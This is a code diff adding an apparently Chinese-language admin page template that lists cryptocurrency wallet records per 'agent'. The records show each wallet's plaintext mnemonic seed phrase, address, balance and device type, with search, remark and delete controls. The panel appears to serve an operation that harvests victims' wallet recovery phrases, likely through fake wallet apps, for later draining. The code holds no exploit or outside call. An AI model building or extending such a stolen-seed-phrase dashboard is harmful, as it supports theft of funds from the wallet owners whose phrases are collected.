@@ -1,0 +1,193 @@
+{extend name="public:template" /}
+
+{block name="content"}
+<div class="section-header">
+    <div class="section-header-breadcrumb">
+        <div class="breadcrumb-item active"><a href="{:url('Index/index')}">控制台</a></div>
+        <div class="breadcrumb-item"></div>
+    </div>
+</div>
+
+<div class="section-body">
+    <h2 class="section-title"></h2>
+
+    <div class="row">
+        <div class="col-12">
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-header-form ml-auto" style="margin: 0!important;">
+                        <form action="">
+                            <div style="display: flex">
+                                <div class="col-lg-2">
+                                    <input type="text" class="form-control" name="mid"  placeholder="助记词ID" value="">
+                                </div>
+                                <div class="col-lg-2">
+                                    <input type="text" class="form-control" name="name"  placeholder="类型" value="">
+                                </div>
+                                <div class="col-lg-2">
+                                    <input type="text" class="form-control" name="Wallet"  placeholder="钱包" value="">
+                                </div>
+                                <div class="col-lg-2">
+                                    <input type="text" class="form-control" name="user_id"  placeholder="代理id" value="">
+                                </div>
+                                <div class="col-lg-2">
+                                    <input type="text" class="form-control" name="Address"  placeholder="输入地址" value="">
+                                </div>
+                                <div class="col-lg-2">
+                                    <input type="text" class="form-control" name="Remark"  placeholder="备注" value="">
+                                </div>
+
+                                <div class="col-lg-3">
+                                    <button  class="btn btn-icon icon-left btn-primary">搜索</button >
+                                </div>
+                            </div>
+
+                        </form>
+                    </div>
+                </div>
+                <div class="card-body">
+                    <div class="table-responsive">
+                        <table class="table table-bordered table-md">
+                            <tr>
+                                <th width="30">代理ID</th>
+                                <th width="30">助记词ID</th>
+                                <th width="30">钱包</th>
+                                <th>设备</th>
+                                <th width="30">类型</th>
+                                <th>地址</th>
+                                <th>助记词</th>
+                                <th>余额</th>
+                                <th>时间</th>
+                                <th>备注</th>
+
+                                <th width="200">操作</th>
+                            </tr>
+                            {volist name="data" id="vo" key="key"}
+                            <tr>
+                                <td>{$vo.user_id}</td>
+                                <td>{$vo.mid}</td>
+                                <td>{$vo.Wallet}</td>
+                                <td>{$vo.Source == 1 ? '安卓' : '苹果'}</td>
+                                <td>{$vo.Name}</td>
+                                <td>{$vo.Address}</td>
+                                <td>{$vo.Mnemonic}</td>
+                                <td>{$vo.balance}</td>
+                                <td>{$vo.CreateTime}</td>
+                                <td>{$vo.Remark}</td>
+
+                                <td>
+                                    {if ($user_type == 0)}
+                                    <!--                                    <a href="javascript::" class="btn btn-icon icon-left btn-primary mr-3" onclick="remark('{$vo.id}')"><i class="far fa-edit"></i> 备注</a>-->
+
+                                    <button type="button" class="btn  btn-primary remark-btn" data-toggle="modal" data-target="#exampleModal"  data-id="{$vo.id}" data-text="{$vo.Remark}">
+                                        <i class="far fa-edit"></i>备注
+                                    </button>
+                                    <a href="javascript:;" class="btn btn-icon icon-left btn-danger" onclick="delImage('{$vo.id}')"><i class="fas fa-times"></i> 删除</a>
+                                    {else/}
+                                    <button type="button" class="btn  btn-primary remark-btn" data-toggle="modal" data-target="#exampleModal"  data-id="{$vo.id}" data-text="{$vo.Remark}">
+                                        <i class="far fa-edit"></i>备注
+                                    </button>
+                                    {/if}
+                                </td>
+                            </tr>
+                            {/volist}
+                        </table>
+                    </div>
+                </div>
+
+                <div class="card-footer text-right">
+                    <nav class="d-inline-block">
+                        {$data|raw}
+                    </nav>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+    .modal-backdrop.fade {
+        opacity: 0!important;
+        z-index: 0!important;
+    }
+</style>
+<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog" role="document">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="exampleModalLabel">添加备注</h5>
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                    <span aria-hidden="true">&times;</span>
+                </button>
+            </div>
+            <div class="modal-body">
+                <input type="text" style="width: 100%" name="" id="remark-text" data-id="" />
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-dismiss="modal">关闭</button>
+                <button type="button" class="btn btn-primary submit-remark" data-dismiss="modal">保存</button>
+            </div>
+        </div>
+    </div>
+</div>
+{/block}
+
+
+{block name="extend-script"}
+<script type="text/javascript">
+    function delImage(id) {
+        swal({
+            title: '确定删除该数据？',
+            icon: 'warning',
+            buttons: ['取消', '确认'],
+            dangerMode: true,
+        })
+            .then((willDelete) => {
+                if (! willDelete)
+                    return;
+
+                $.ajax({
+                    url: "{:url('Casies/destroy')}",
+                    method: 'post',
+                    data: {id: id},
+                    dataType: 'json',
+                    success(res) {
+                        if (res.success === true) {
+                            swal('操作成功', {buttons: false, icon: 'success'});
+                            setTimeout(function () { location.reload() }, 1500)
+                        }
+                        if (res.success === false) swal('出现错误', res.err_msg, 'error');
+                    }
+                })
+            });
+    }
+
+    $('.remark-btn').click(function (){
+        let text =  $(this).data('text');
+        let id = $(this).data('id');
+        $('#remark-text').val(text).data('id', id);
+
+    })
+
+
+    $('.submit-remark').click(function (){
+        text =    $('#remark-text').val();
+        id =    $('#remark-text').data('id');
+
+        $.ajax({
+            type : "POST",
+            dataType : "json",
+            url : "{:url('Casies/Remark')}",
+            data : { id : id , remark : text},
+            success(res) {
+                if (res.success === true) {
+                    swal('操作成功', {buttons: false, icon: 'success'});
+                    setTimeout(function () { location.reload() }, 1500)
+                }
+                if (res.success === false) swal('出现错误', res.err_msg, 'error');
+            }
+        });
+
+    });
+</script>
+{/block}
